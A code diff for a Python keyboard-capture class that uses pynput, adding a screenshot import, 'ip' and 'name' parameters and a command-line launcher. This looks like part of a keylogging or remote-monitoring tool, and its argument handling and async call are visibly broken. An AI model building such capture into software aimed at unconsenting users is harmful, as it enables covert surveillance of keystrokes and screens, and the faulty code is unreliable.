@@ -1,8 +1,12 @@
 from pynput import keyboard
+import pyscreenshot, datetime, sys, asyncio, threading
+
+threads_done = threading.Event()
+
 class C_Keyboard:
     """ Capture keyboard events """
     
-    def __init__(self,start=False):
+    def __init__(self,start=False,name="None",ip="None"):
         """Start the listener"""
         
         # Collect events until released
@@ -35,4 +39,20 @@ class C_Keyboard:
             if key.char != None: pass#print(key.char)
         except AttributeError: print(key)
         
-keyboard = C_Keyboard(start=True)
+if sys.argv[0] == 'main_mouse.py':
+    """ Run the server with arguments """
+    
+    # Récupérer les arguments
+    if len(sys.argv) >= 2:
+
+        # Parcourir les arguments et les analyser
+        for arg in sys.argv[1:]:
+            if arg == "start=True":start = True
+            elif arg == "ip=":ip = sys.argv[2]
+            elif arg == "name=":name = sys.argv[2]
+        server_c_picture = C_Keyboard()
+        
+        asyncio.run(server_c_picture.__init__(start=start,name=name,ip=ip))
+        threads_done.clear()
+        sys.exit() #close terminal if exist
+    else:pass#osef
